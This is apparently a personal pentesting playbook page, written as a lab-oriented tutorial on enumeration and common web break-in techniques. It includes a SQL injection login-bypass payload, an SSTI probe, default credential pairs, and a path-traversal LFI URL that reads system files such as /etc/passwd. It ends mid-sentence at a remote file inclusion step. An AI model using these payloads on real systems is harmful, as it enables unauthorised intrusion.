<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-Hacking/Playbooks/Pentesting" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.8.1">
<title data-rh="true">Pentesting | agalera.eu</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://www.agalera.eu/docs/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://www.agalera.eu/docs/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://www.agalera.eu/docs/playbooks/pentesting"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Pentesting | agalera.eu"><meta data-rh="true" name="description" content="While performing pentesting, there are a series of steps that are always the same. The steps are (sorted by order)"><meta data-rh="true" property="og:description" content="While performing pentesting, there are a series of steps that are always the same. The steps are (sorted by order)"><link data-rh="true" rel="canonical" href="https://www.agalera.eu/docs/playbooks/pentesting"><link data-rh="true" rel="alternate" href="https://www.agalera.eu/docs/playbooks/pentesting" hreflang="en"><link data-rh="true" rel="alternate" href="https://www.agalera.eu/docs/playbooks/pentesting" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Pentesting","item":"https://www.agalera.eu/docs/playbooks/pentesting"}]}</script><link rel="preconnect" href="https://www.google-analytics.com">
<link rel="preconnect" href="https://www.googletagmanager.com">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-S8VGYBN25C"></script>
<script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-S8VGYBN25C",{anonymize_ip:!0})</script><link rel="stylesheet" href="/docs/assets/css/styles.f96ca0f1.css">
<script src="/docs/assets/js/runtime~main.80ad21fd.js" defer="defer"></script>
<script src="/docs/assets/js/main.a13c6dbc.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg xmlns="http://www.w3.org/2000/svg" style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t="light";var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",e||t),document.documentElement.setAttribute("data-theme-choice",e||t)}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><a class="navbar__brand" href="/docs/"><div class="navbar__logo"><img src="/docs/img/logo.svg" alt="agalera.eu" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/docs/img/logo.svg" alt="agalera.eu" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">agalera.eu</b></a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><div class="navbar__search"><span aria-label="expand searchbar" role="button" class="search-icon" tabindex="0"></span><input id="search_input_react" type="search" placeholder="Loading..." aria-label="Search" class="navbar__search-input search-bar" disabled=""></div></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/flight-sim/dcs/f5e">Flight Simulators</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" href="/docs/languages/bash">Hacking</a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/languages/bash">Language security</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" tabindex="0" href="/docs/playbooks/active-directory">Playbooks</a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/playbooks/active-directory">Active Directory</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/playbooks/file-transfer">File transfer</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/playbooks/improve-shell">Improve shell</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/playbooks/owasp">OWASP TOP 10</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/playbooks/pentesting-windows">Pentesting Windows</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/playbooks/pentesting">Pentesting</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/playbooks/reversing">Reversing</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/playbooks/sqli">SQL Injections</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/tooling/crackmapexec">Tooling</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/useful-links">Useful links</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/write-up/htb-academy/file-inclusion">Write-ups</a></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/linux-useful-commands">Linux</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/Shortcuts/Chrome">Shortcuts</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/">Welcome</a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/docs/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Hacking</span></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Playbooks</span></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">Pentesting</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Pentesting</h1></header>
<p>While performing pentesting, there are a series of steps that are always the same. The steps are (sorted by order)</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="enumeration">Enumeration<a href="#enumeration" class="hash-link" aria-label="Direct link to Enumeration" title="Direct link to Enumeration">​</a></h2>
<p>Using <a href="/docs/tooling/nmap">nmap</a> the attacker needs to see what is open in the target machine.</p>
<p>At this stage, we&#x27;ll behave like a legitimate user, e.g.: perform regular searches, etc...</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web-enumeration">Web enumeration<a href="#web-enumeration" class="hash-link" aria-label="Direct link to Web enumeration" title="Direct link to Web enumeration">​</a></h3>
<p>If <code>nmap</code> shows some web server, it&#x27;s worth to check the following enumeration techniques.</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="directory-brute-foce">Directory brute-foce<a href="#directory-brute-foce" class="hash-link" aria-label="Direct link to Directory brute-foce" title="Direct link to Directory brute-foce">​</a></h4>
<p>This is a technique to discover all public paths of a website. There might situation where the web server is serving something but it&#x27;s not referenced anywhere on the website. This is know as well as dir busting.</p>
<p>The technique consist in using a list of words and try all the combinations in the dictionary to see if the web server returns a positive (e.g. 200 OK) answer to the page. If so, we have discovered a page in that path.</p>
<p>There are many tools to perform this such as <a href="/docs/tooling/gobuster">gobuster</a> and <a href="/docs/tooling/ffuf">ffuf</a>.</p>
<p>You can use as well the sitemap functionality in the burp suite.</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="sub-domain-brute-force">Sub-domain brute force<a href="#sub-domain-brute-force" class="hash-link" aria-label="Direct link to Sub-domain brute force" title="Direct link to Sub-domain brute force">​</a></h4>
<p>This techniques tries to discover sub-domains configured, you can do it by checking the DNS records or the virtual hosts configured in a server.</p>
<p>Usually this works by providing values in the HTTP Host header.</p>
<p>There are many tools to perform this such as <a href="/docs/tooling/gobuster">gobuster</a> and <a href="/docs/tooling/ffuf">ffuf</a>.</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="robotstxt">Robots.txt<a href="#robotstxt" class="hash-link" aria-label="Direct link to Robots.txt" title="Direct link to Robots.txt">​</a></h4>
<p>It&#x27;s always interesting to check the contents of robots.txt, for instance here, the file reveals the server hosts a joomla CMS:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># If the Joomla site is installed within a folder</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># eg www.example.com/joomla/ then the robots.txt file</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># MUST be moved to the site root</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># eg www.example.com/robots.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># AND the joomla folder name MUST be prefixed to all of the</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># paths.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># eg the Disallow rule for the /administrator/ folder MUST</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># be changed to read</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Disallow: /joomla/administrator/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># For more information about the robots.txt standard, see:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># https://www.robotstxt.org/orig.html</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">User-agent: *</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Disallow: /administrator/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Disallow: /api/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Disallow: /bin/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Disallow: /cache/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Disallow: /cli/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Disallow: /components/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Disallow: /includes/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Disallow: /installation/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Disallow: /language/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Disallow: /layouts/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Disallow: /libraries/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Disallow: /logs/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Disallow: /modules/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Disallow: /plugins/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Disallow: /tmp/</span><br></span></code></pre></div></div>
<p>It also gives an idea of possible paths into the application</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="whatweb">Whatweb<a href="#whatweb" class="hash-link" aria-label="Direct link to Whatweb" title="Direct link to Whatweb">​</a></h4>
<p><a href="https://github.com/urbanadventurer/WhatWeb" target="_blank" rel="noopener noreferrer">https://github.com/urbanadventurer/WhatWeb</a></p>
<p>This program will output a list of technologies used in the website by reading the HTTP response headers, etc...</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">└─$ whatweb https://github.com/urbanadventurer/WhatWeb          </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">https://github.com/urbanadventurer/WhatWeb [200 OK] Cookies[_gh_sess,_octo,logged_in], Country[UNITED STATES][US], Email[banner@2x.png,nk@dsigned.gr,snoo-home@2x.png], HTML5, HTTPServer[GitHub.com], HttpOnly[_gh_sess,logged_in], IP[140.82.121.3], Open-Graph-Protocol[object][1401488693436528], OpenSearch[/opensearch.xml], PoweredBy[WordPress,[PHP/5,[phpBB],,abc,abc\,abc\&amp;quot;,phpBB,phpBB&amp;quot;], Script[application/javascript,application/json], Strict-Transport-Security[max-age=31536000; includeSubdomains; preload], Title[GitHub - urbanadventurer/WhatWeb: Next generation web scanner], UncommonHeaders[x-content-type-options,referrer-policy,content-security-policy,x-github-request-id], probably WordPress, X-Frame-Options[deny], X-XSS-Protection[0]</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="smb-enumeration">SMB enumeration<a href="#smb-enumeration" class="hash-link" aria-label="Direct link to SMB enumeration" title="Direct link to SMB enumeration">​</a></h3>
<p>If <code>nmap</code> show the Sambda related ports, see: <a href="https://www.cyberciti.biz/faq/what-ports-need-to-be-open-for-samba-to-communicate-with-other-windowslinux-systems/" target="_blank" rel="noopener noreferrer">https://www.cyberciti.biz/faq/what-ports-need-to-be-open-for-samba-to-communicate-with-other-windowslinux-systems/</a></p>
<p>You can try to enumerate the Sambda shared and check if they can be accessed anonimously.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">smbclient -L \\&lt;ip&gt; -N</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Sharename       Type      Comment</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ---------       ----      -------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ADMIN$          Disk      Remote Admin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        C$              Disk      Default share</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        IPC$            IPC       Remote IPC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        WorkShares      Disk</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SMB1 disabled -- no workgroup available</span><br></span></code></pre></div></div>
<p>Check <a href="/docs/tooling/smbclient">smbclient</a> for reference</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="breaking-in">Breaking in<a href="#breaking-in" class="hash-link" aria-label="Direct link to Breaking in" title="Direct link to Breaking in">​</a></h2>
<p>This stage is the most varied one, the idea is to find a vulnerability to get to a shell into the machine, no matter if the user is privileged or not.</p>
<p>At this point, you should have a list of services (and versions) that are running in the machine. You can do a google query with the service you want to discover vulnerabilities.</p>
<p>The attack vector is different to each machine, here you can find most common vector attacks</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="anonymous-access">Anonymous access<a href="#anonymous-access" class="hash-link" aria-label="Direct link to Anonymous access" title="Direct link to Anonymous access">​</a></h3>
<p>The user might have <code>ftp</code> or <code>tftp</code> or <code>smb</code> shares with anonymous access. It&#x27;s worth taking a look because those access might leak some valuable information. Additionally, you can also check <code>metasploit</code> to check for this kind of access.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="guessbrute-force-credentials">Guess/Brute force credentials<a href="#guessbrute-force-credentials" class="hash-link" aria-label="Direct link to Guess/Brute force credentials" title="Direct link to Guess/Brute force credentials">​</a></h3>
<p>If you discover a login page, why not trying some default user/password combinations? Try the following user/password combinations first:</p>
<ul>
<li>admin<!-- -->:admin</li>
<li>administrator<!-- -->:administrator</li>
<li>admin<!-- -->:administrator</li>
<li>admin<!-- -->:password</li>
<li>administrator<!-- -->:password</li>
<li>...</li>
</ul>
<p>If you are login to a third-party applications it&#x27;s wise to do a google search for default credentials.</p>
<p>You can try a dictionary attack to bruce force user/password combinations.</p>
<p>You can use a tool like <a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank" rel="noopener noreferrer">thc-hydra</a>. However, this will fail if there if there&#x27;s any kind of CSRF protection.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="sql-injection">SQL Injection<a href="#sql-injection" class="hash-link" aria-label="Direct link to SQL Injection" title="Direct link to SQL Injection">​</a></h3>
<p>Poorly programmed queries can be very dangerous and leads to escaping issues in the queries.</p>
<p>If the SQL queries are poorly built, it means that they are susceptible to SQL injections. If the user input is not sanitised, we can break up SQL queries that will cause problems, such as bypassing a login page.</p>
<p>A typical SQL query for a login page can look like this:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> members </span><span class="token keyword" style="color:#00009f">WHERE</span><span class="token plain"> username </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;admin&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">AND</span><span class="token plain"> password </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;admin&#x27;</span><br></span></code></pre></div></div>
<p>If the input values are not sanitised, we can break the query by putting a comment character to comment the part of query that does the password checking:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> members </span><span class="token keyword" style="color:#00009f">WHERE</span><span class="token plain"> username </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;admin&#x27;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">#&#x27; AND password = &#x27;kjdfjklsdf&#x27;</span><br></span></code></pre></div></div>
<p>Now the query becomes:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> members </span><span class="token keyword" style="color:#00009f">WHERE</span><span class="token plain"> username </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;admin&#x27;</span><br></span></code></pre></div></div>
<p>therefore, the query is no longer checking for password and the login page is bypassed.</p>
<p>Pay attention when breaking the rest of the query with comments. The standard comment <code>--</code> might not always work, it&#x27;s worth trying another kind of comments like <code>#</code>. Also, you might want to URL encode the escaping characters.</p>
<p>SQL injections reference: <a href="https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet" target="_blank" rel="noopener noreferrer">https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet</a></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="server-side-template-injection-ssti">Server side template injection (SSTI)<a href="#server-side-template-injection-ssti" class="hash-link" aria-label="Direct link to Server side template injection (SSTI)" title="Direct link to Server side template injection (SSTI)">​</a></h3>
<p>if you see a search form and you type something and you see the output of what you typed again in the webpage, the webpage might be susceptible for SSTI. Try to identify which template engine and search how to exploit it.</p>
<p>If the target is using a templating engine, it is possible to use the template injection to execute commands in the server.</p>
<p>One easy way to test that is to put something like {{7*7}} in the template and check for the result.</p>
<p>If the template executes, we&#x27;ll see the result, out of luck we will see nothing. Or maybe we&#x27;ll see some trace that reveals the technology behind.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="arbitrary-file-upload">Arbitrary file upload<a href="#arbitrary-file-upload" class="hash-link" aria-label="Direct link to Arbitrary file upload" title="Direct link to Arbitrary file upload">​</a></h3>
<p>This is a very interesting vulnerability. It lets the attacker upload some file to the server. You can do this to start a reverse shell. That is the targeted machine establish a permanent connection to the attacker machine and it provides a shell where the attacker can run commands as if it was inside the machine.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="file-inclusion-lfirfi">File inclusion (LFI,RFI)<a href="#file-inclusion-lfirfi" class="hash-link" aria-label="Direct link to File inclusion (LFI,RFI)" title="Direct link to File inclusion (LFI,RFI)">​</a></h3>
<p>Some pages include other pages in order to improve re-usability, e.g. header and footer. If this is not configured properly, an attacker can use the include functionality to read local files.</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">http://unika.htb/index.php?page=../../../../../../../../../../windows/system32/drivers/etc/hosts</span><br></span></code></pre></div></div>
<p>You can try to read the following files for Linux:</p>
<ul>
<li>/etc/hosts</li>
<li>/etc/passwd</li>
</ul>
<p>and for Windows:</p>
<ul>
<li>C:/Windows/System32/drivers/etc/hosts</li>
<li>c:/windows/win.ini</li>
</ul>
<p>Depending on the inclusion it might lead to Remote File Inclusion, which is execute remote files.</p>
<p>This can be used for example to force the target make a call to a compromised host in the same network and capture the credentials challenge:</p>
